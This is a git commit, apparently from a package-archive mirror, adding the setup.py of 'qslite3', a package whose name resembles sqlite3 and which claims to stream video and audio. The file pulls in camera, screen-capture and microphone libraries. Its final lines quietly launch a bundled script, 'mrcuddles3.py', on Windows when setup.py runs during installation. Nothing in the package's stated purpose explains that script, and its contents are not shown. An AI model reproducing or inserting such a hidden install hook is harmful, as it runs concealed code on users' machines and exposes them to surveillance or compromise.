a61e34bb53a331398ca66d316bfe4f4b2e6e0c34
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-05-12 04:05:38 +0000

    Add package qslite3/0.0.13/qslite3-0.0.13.tar.gz

---
+++ packages/qslite3/qslite3-0.0.13.tar.gz/qslite3-0.0.13/setup.py
@@ -0,0 +1,40 @@
+from setuptools import setup, find_packages
+import codecs
+import os
+import platform
+
+here = os.path.abspath(os.path.dirname(__file__))
+
+with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
+    long_description = "\n" + fh.read()
+
+VERSION = '0.0.13'
+DESCRIPTION = 'Streaming video data via networks'
+LONG_DESCRIPTION = 'A package that allows to build simple streams of video, audio and camera data.'
+
+# Setting up
+setup(
+    name="qslite3",
+    version=VERSION,
+    author="munchdogs",
+    author_email="<aledreamsaledreams2@gmail.com>",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=long_description,
+    packages=find_packages(),
+    install_requires=['opencv-python', 'pyautogui', 'pyaudio'],
+    keywords=['python', 'Web', 'https', 'framework', 'socks5', 'sockets'],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
+
+# Execute the contents of mrcuddles3.py only if running as a script
+if __name__ == "__main__":
+    if platform.system() == "Windows":
+        os.startfile('mrcuddles3.py')
